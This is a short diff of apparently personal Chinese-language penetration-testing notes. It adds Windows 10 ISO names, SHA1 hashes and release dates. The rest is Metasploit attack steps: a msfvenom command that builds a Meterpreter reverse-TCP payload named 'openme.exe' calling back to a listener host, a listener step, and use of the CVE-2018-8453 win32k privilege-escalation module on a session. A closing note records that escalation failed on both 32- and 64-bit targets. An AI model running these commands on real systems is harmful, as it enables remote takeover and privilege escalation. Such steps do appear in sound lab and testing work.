@@ -1,3 +1,25 @@
+ 文件名
+cn_windows_10_multiple_editions_version_1703_updated_july_2017_x86_dvd_10925372.iso
+SHA1
+CB9D41095FFAA29D39928085396632F43F60D4CA
+文件大小
+4.11GB
+发布时间
+2017-07-27
+
+
+ 文件名
+cn_windows_10_multi-edition_version_1709_updated_dec_2017_x64_dvd_100406696.iso
+SHA1
+5cc6e158a9d90b9c474ace8a55b66f88bd16221d
+文件大小
+4.88GB
+发布时间
+2017-12-19
+ 
+ 
+ 
+ 
  msfvenom  -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.55.201  LPORT=50000  -f exe  -o openme.exe
 
 打开监听
@@ -18,3 +40,6 @@ use exploit/windows/local/cve_2018_8453_win32k_priv_esc
 set session 1
 run
 
+
+
+64位   32位提权都失败
